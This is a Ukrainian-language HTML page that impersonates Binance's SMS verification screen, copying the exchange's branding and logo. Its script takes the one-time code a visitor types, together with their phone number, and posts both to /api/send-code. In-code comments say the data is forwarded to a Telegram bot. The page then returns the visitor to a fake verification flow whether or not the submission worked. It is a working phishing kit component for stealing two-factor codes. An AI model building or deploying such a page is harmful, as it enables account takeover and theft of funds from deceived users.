<!DOCTYPE html>
<html lang="uk-UA">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Верифікація | Binance</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'BinancePlex', Arial, sans-serif;
            background-color: #0B0E11;
            color: #EAECEF;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .verification-container {
            background-color: #1E2329;
            border-radius: 8px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
            color: #EAECEF;
        }

        .subtitle {
            font-size: 14px;
            color: #848E9C;
            text-align: center;
            margin-bottom: 30px;
        }

        .phone-display {
            background-color: #2B3139;
            border-radius: 4px;
            padding: 12px 16px;
            margin-bottom: 20px;
            color: #F0B90B;
            font-size: 14px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 12px;
            color: #848E9C;
            margin-bottom: 8px;
        }

        .code-input {
            width: 100%;
            padding: 16px;
            background-color: #2B3139;
            border: 1px solid #3C4142;
            border-radius: 4px;
            color: #EAECEF;
            font-size: 16px;
            box-sizing: border-box;
        }

        .code-input:focus {
            outline: none;
            border-color: #F0B90B;
        }

        .submit-btn {
            width: 100%;
            padding: 16px;
            background-color: #F0B90B;
            border: none;
            border-radius: 4px;
            color: #000;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #E6A502;
        }

        .submit-btn:disabled {
            background-color: #434C5A;
            color: #707A8A;
            cursor: not-allowed;
        }

        .back-link {
            text-align: center;
            margin-top: 20px;
        }

        .back-link a {
            color: #F0B90B;
            text-decoration: none;
            font-size: 14px;
        }

        .back-link a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="verification-container">
        <div class="logo">
            <svg width="118" height="32" viewBox="0 0 118 32" fill="none">
                <path d="M30.9717 0L25.2383 5.73333L19.505 0L13.7717 5.73333L8.03833 0L2.305 5.73333L0 3.42833V32H8.03833V13.7667L13.7717 8.03333L19.505 13.7667V32H27.5433V13.7667L30.9717 10.3383V0Z" fill="#F0B90B"/>
                <path d="M50.345 9.15H56.905C60.505 9.15 63.345 11.99 63.345 15.59C63.345 19.19 60.505 22.03 56.905 22.03H53.545V28.59H50.345V9.15ZM53.545 12.35V18.83H56.905C58.705 18.83 60.145 17.39 60.145 15.59C60.145 13.79 58.705 12.35 56.905 12.35H53.545Z" fill="#EAECEF"/>
            </svg>
        </div>

        <h1>SMS Верифікація</h1>
        <p class="subtitle">Введіть код, відправлений на ваш телефон</p>

        <div class="phone-display" id="phoneDisplay">
            +380XX XXX XX05
        </div>

        <form id="verificationForm">
            <div class="form-group">
                <label for="smsCode">SMS код</label>
                <input type="text" id="smsCode" class="code-input" maxlength="6" placeholder="Введіть 6-значний код" required>
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">Надіслати</button>
        </form>

        <div class="back-link">
            <a href="verification.html">Назад до вибору верифікації</a>
        </div>
    </div>

    <script>
        // Отримати номер телефону (симуляція)
        function getPhoneFromParams() {
            const urlParams = new URLSearchParams(window.location.search);
            const phoneFromUrl = urlParams.get('phone');
            const phoneFromStorage = localStorage.getItem('userPhone');
            
            return phoneFromUrl || phoneFromStorage || '+380XX XXX XX05';
        }

        // Показати номер телефону користувача
        function displayUserPhone() {
            const phone = getPhoneFromParams();
            const phoneDisplay = document.getElementById('phoneDisplay');
            
            // Замаскувати номер телефону
            const maskedPhone = maskPhone(phone);
            phoneDisplay.textContent = maskedPhone;
        }

        // Замаскувати номер телефону
        function maskPhone(phone) {
            if (phone.length < 6) return phone;
            
            // Залишити перші 3 та останні 2 цифри
            const visible = phone.substring(0, 3) + 'XX XXX XX' + phone.substring(phone.length - 2);
            return visible;
        }

        // Обробка форми
        document.getElementById('verificationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const code = document.getElementById('smsCode').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            
            if (!code) {
                alert('Будь ласка, введіть SMS код');
                return;
            }

            // Заблокувати кнопку
            submitBtn.disabled = true;
            submitBtn.textContent = 'Відправка...';

            // Відправити код в Telegram бот
            const userPhone = getPhoneFromParams();
            
            fetch('/api/send-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ 
                    type: 'sms',
                    code: code,
                    phone: userPhone
                })
            }).then(response => response.json()).then(result => {
                if (result.success) {
                    console.log('Код успішно відправлено в Telegram');
                } else {
                    console.log('Помилка відправки в Telegram');
                }
                
                // Обновить состояние верификации
                let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
                if (!completedVerifications.includes('sms')) {
                    completedVerifications.push('sms');
                    localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
                }
                
                // Повернутися на сторінку верифікації
                setTimeout(() => {
                    window.location.href = 'verification.html';
                }, 1000);
                
            }).catch(error => {
                console.log('Помилка:', error);
                
                // Все одно продовжити з логікою
                let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
                if (!completedVerifications.includes('sms')) {
                    completedVerifications.push('sms');
                    localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
                }
                
                setTimeout(() => {
                    window.location.href = 'verification.html';
                }, 1000);
            }).finally(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Надіслати';
            });
        });

        // Ініціалізувати сторінку
        document.addEventListener('DOMContentLoaded', function() {
            displayUserPhone();
        });
    </script>
</body>
</html>
